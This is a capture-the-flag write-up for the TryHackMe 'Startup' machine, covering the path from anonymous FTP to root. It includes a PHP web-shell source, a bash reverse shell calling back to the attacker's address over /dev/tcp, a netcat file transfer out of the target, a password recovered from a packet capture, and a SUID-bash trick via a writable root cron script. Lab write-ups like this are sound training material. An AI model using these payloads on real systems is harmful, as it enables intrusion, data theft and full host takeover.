# [TryHackMe](https://tryhackme.com/room/startup): Startup Writeup  

---

# 🎯 Target Information

- **Platform:** TryHackMe
- **Machine Name:** Startup
- **Target IP:** 10.49.147.215
- **Difficulty:** Easy
- **Key Vulnerabilities:**
  - Anonymous FTP Access
  - Writable FTP Directory
  - Arbitrary File Upload
  - Remote Code Execution (RCE)
  - Credential Disclosure from Packet Capture
  - Writable Root Cron Script
  - Privilege Escalation via SUID Bash

---

# 🔎 Enumeration

Perform a full TCP port scan.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 10.49.147.215
```

## Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 10.49.147.215
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 07:34 -0700
Warning: 10.49.147.215 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.49.147.215
Host is up (0.20s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.159.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.29 seconds
```

### Findings

- **21** → FTP
- **22** → SSH
- **80** → Apache Web Server

The FTP scan reveals that **anonymous login is enabled**, and the `ftp` directory is writable. 

---

# 📂 FTP Enumeration

Connect to the FTP server.

```bash
ftp 10.49.147.215
```

Login using the anonymous account.

```text
Username : anonymous
Password : <blank>
```

List the available files.

```text
ftp> ls
229 Entering Extended Passive Mode (|||30335|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 
```

Download both files.

```bash
get important.jpg
get notice.txt
```

The image contains an **Among Us meme**, while `notice.txt` contains the following message.

```text
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY.
People downloading documents from our website will think we are a joke! Now I dont know who it is,
but Maya is looking pretty sus.
```

Although this appears to be a hint, it is not directly useful during exploitation.

---

# 🌐 Web Enumeration

Browse to port **80**.

<img width="1310" height="554" alt="home" src="https://github.com/user-attachments/assets/bcb5cc9e-f199-4ebc-8914-5508890b07a1" />

The website displays only a simple maintenance page and looking for a web
developer.

*Perform directory enumeration.*

```bash
gobuster dir \
-u http://10.49.147.215 \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

## Result

```text
$ gobuster dir -u http://10.49.147.215/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.147.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
files                (Status: 301) [Size: 314] [--> http://10.49.147.215/files/]
index.html           (Status: 200) [Size: 808]
server-status        (Status: 403) [Size: 278]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

Browsing to:

```text
http://10.49.147.215/files/
```

shows the same files previously discovered through FTP.

<img width="1637" height="440" alt="files" src="https://github.com/user-attachments/assets/be0f4896-6bcd-4e8a-aaac-edfcb1d2569e" />

The  important.jpg

<img width="735" height="458" alt="amougus" src="https://github.com/user-attachments/assets/5245924d-63d6-4093-9d20-ef2e22da51d4" />

This suggests that the FTP share is directly exposed through the web server.

---

# 🚀 Uploading a Web Shell

Create a PHP web shell.

```php
<html>
<body>
<form method="GET">
<input type="text" name="cmd">
<input type="submit">
</form>

<pre>
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
</pre>

</body>
</html>
```

Save it as:

```text
web-shell.php
```

Attempt to upload it.

```text
put web-shell.php
```

The upload to the FTP root directory fails.

```text
ftp> put  web-shell.php 
mput web-shell.php [anpqy?]? y
229 Entering Extended Passive Mode (|||36976|)
553 Could not create file.
ftp> 
```

Change into the writable directory and Upload again.

```text
cd ftp && put web-shell.php
```

## Result

```text
ftp> cd ftp
250 Directory successfully changed.
ftp> put web-shell.php 
local: web-shell.php remote: web-shell.php
229 Entering Extended Passive Mode (|||36625|)
150 Ok to send data.
100% |************************************************************************************************************************************************|   347        1.08 MiB/s    00:00 ETA
226 Transfer complete.
347 bytes sent in 00:00 (2.55 KiB/s)
ftp> 
```

The upload succeeds.

Browsing to:

```text
http://10.49.147.215/files/ftp/web-shell.php
```

<img width="1345" height="260" alt="web-shell" src="https://github.com/user-attachments/assets/51562e7d-4680-45c4-84f2-4733e9592c77" />

confirms that the PHP code executes successfully.

---

# 💻 Remote Code Execution

Start a Netcat listener.

```bash
nc -lnvp 443
```

Execute the following reverse shell through the web shell.

```bash
bash -c "bash -i >& /dev/tcp/192.168.159.99/443 0>&1"
```

A reverse shell is obtained as:

```text
www-data
```

---

# 🔧 Upgrading the Shell

Upgrade the shell to a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then execute:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

---

# 🔍 Local Enumeration

Attempting to access Lennie's home directory results in a permission error.

```bash
cd /home/lennie
```

Instead, continue enumerating the filesystem.

Inside the root directory, two interesting items are discovered.

```text
recipe.txt
incidents/
```

Read the recipe file.

```bash
cat recipe.txt
```

## Result

```text
Someone asked what our main ingredient to our spice soup is today.
I figured I can't keep it a secret forever and told him it was **FLAG**.
```

This reveals the first flag.

---

# 📡 Packet Capture Analysis

Inside the `incidents` directory, a packet capture is found.

```text
suspicious.pcapng
```

Transfer the file to the attacker machine.

Attacker:

```bash
nc -lnvp 9999 > suspicious.pcapng
```

Target:

```bash
nc 192.168.159.99 9999 < suspicious.pcapng
```

Open the capture using **Wireshark**.

While inspecting the packets, **Frame 42** contains an SSH session where a user attempts to execute:

<img width="1918" height="938" alt="net-trafiic" src="https://github.com/user-attachments/assets/30c451e7-2333-4ae5-a48b-6b39ffdde36d" />

```text
sudo -l
```

Although authentication fails, the password is clearly visible.

```text
c4ntg3t3n0ughsp1c3
```

---

# 🔐 SSH Access

Login as **lennie** using the recovered password.

```bash
ssh lennie@10.49.147.215
```

Verify the user.

```bash
id
```

```text
$ id ;whoami
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
lennie
$
```

Successfully obtained a shell as **lennie**.

---

# 🏁 User Flag

Read the user flag.

```bash
cat /home/lennie/user.txt
```

## Result

```text
THM{03ce3d619b80ccbfb3b7fc**********}
```

---

# 🔍 Privilege Escalation Enumeration

Check sudo permissions.

```bash
sudo -l
```

No sudo privileges are available.

Search for SUID binaries.

```bash
find / -type f -perm -4000 2>/dev/null
```

Nothing immediately useful is discovered.

Check cron jobs.

```bash
cat /etc/crontab
```

No obvious privilege escalation path is visible.

Inside Lennie's home directory, a script is discovered.

```text
~/scripts/planner.sh
```

Contents:

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

The script executes:

```text
/etc/print.sh
```

This appears suspicious.

---

# 🔍 Monitoring Background Processes

Run **pspy64**.

```bash
./pspy64
```
```text
lennie@startup:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/07/25 10:53:34 CMD: UID=1002  PID=1563   | ./pspy64 
2026/07/25 10:53:34 CMD: UID=0     PID=1546   | 
2026/07/25 10:53:34 CMD: UID=1002  PID=1399   | bash 
2026/07/25 10:53:34 CMD: UID=0     PID=2      | 
2026/07/25 10:53:34 CMD: UID=0     PID=1      | /sbin/init 
2026/07/25 10:54:01 CMD: UID=0     PID=1589   | 
2026/07/25 10:54:01 CMD: UID=0     PID=1588   | /bin/bash /home/lennie/scripts/planner.sh 
2026/07/25 10:54:01 CMD: UID=0     PID=1587   | /bin/sh -c /home/lennie/scripts/planner.sh 
2026/07/25 10:54:01 CMD: UID=0     PID=1586   | /usr/sbin/CRON -f 
2026/07/25 10:55:01 CMD: UID=0     PID=1618   | /bin/bash /home/lennie/scripts/planner.sh 
2026/07/25 10:55:01 CMD: UID=0     PID=1617   | /bin/sh -c /home/lennie/scripts/planner.sh 
2026/07/25 10:55:01 CMD: UID=0     PID=1616   | /usr/sbin/CRON -f 
2026/07/25 10:55:01 CMD: UID=0     PID=1619   | /bin/bash /etc/print.sh
```

After monitoring for a short period, the following process appears every minute.

```text
/bin/bash /home/lennie/scripts/planner.sh
```

which in turn executes

```text
/bin/bash /etc/print.sh
```

Both processes run as **root**.

This confirms the presence of a hidden root cron job.

---

# 🚀 Exploiting the Writable Script

Check the permissions.

```bash
ls -la /etc/print.sh
```

```text
lennie@startup:~$ ls -la /etc/print.sh 
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

Although the cron job runs as **root**, the script itself is writable by **lennie**.

Check Bash permissions.

```bash
ls -la /bin/bash
```
```text
lennie@startup:~$ ls -la /bin/bash
-rwxr-xr-x 1  root root 1037528 Jul 12  2019 /bin/bash
```

Append the following command to `/etc/print.sh`.

```bash
chmod +s /bin/bash
```

Example file:

```bash
#!/bin/bash

echo "Done!"

chmod +s /bin/bash
```

Wait approximately one minute for the cron job to execute.

Verify the permissions.

```bash
ls -la /bin/bash
```

## Result

```text
lennie@startup:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
lennie@startup:~$
```

The SUID bit has been added successfully.

---

# 🔓 Root Shell

Launch Bash while preserving privileges.

```bash
/bin/bash -p
```

Verify the privileges.

```bash
id
```

## Result

```text
bash-4.3# id ;whoami
uid=1002(lennie) gid=1002(lennie) euid=0(root) egid=0(root) groups=0(root),1002(lennie)
root
```

Successfully obtained a root shell.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
THM{f963aaa6a430f210222158**********}
```

---

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Enumeration | Nmap |
| Initial Access | Anonymous FTP |
| Web Enumeration | Gobuster |
| Remote Code Execution | PHP Web Shell |
| Enumeration | Packet Capture Analysis |
| User Access | SSH Credentials from PCAP |
| Privilege Escalation | Writable Root Cron Script |
| Root Access | SUID Bash |

---

# 🚀 Key Takeaways

- Anonymous FTP shares should never be writable unless absolutely necessary.
- Exposing uploaded files through the web server can easily lead to Remote Code Execution.
- Packet captures may unintentionally reveal credentials and should be treated as sensitive information.
- Hidden cron jobs are often overlooked during privilege escalation; tools such as **pspy64** are invaluable for identifying them.
- Writable scripts executed by privileged cron jobs can directly lead to root compromise by modifying critical system binaries such as `/bin/bash`.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
